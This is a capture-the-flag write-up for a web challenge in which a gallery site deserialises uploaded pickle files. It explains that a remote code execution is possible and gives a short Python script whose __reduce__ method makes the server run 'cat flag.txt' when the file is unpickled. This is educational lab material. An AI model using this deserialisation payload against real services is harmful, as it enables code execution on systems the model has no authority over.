## solyanka gallery

Category: Web  
Difficulty: Medium

<img src="images/challenge.png" width=400>

In the challenge website, we are allowed to submit a pickle file, which will be deserialised and displayed.  

<img src="images/website.png" width=400>
<img src="images/source.png" width=600>

The flag file is also in the same directory as the server code.  

<img src="images/dockerfile.png" width=400>

Looking at the source code, we can see that the challenge author has left us a hint.

<img src="images/hint.png" width=400>

Searching online, we discover that a [RCE exploit](https://github.com/advisories/GHSA-655q-fx9r-782v) of Pickle's deserialisation already exists.  

We can then write an exploit script to create a pickle file that outputs the flag file on deserialisation.

```python
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', 'flag.txt'],))

payload = pickle.dumps(Exploit())

with open("payload.pkl", "wb") as f:
    f.write(payload)
```

After submitting the payload file on the website, we observe that the RCE has indeed revealed the flag.  

<img src="images/flag.png" width=600>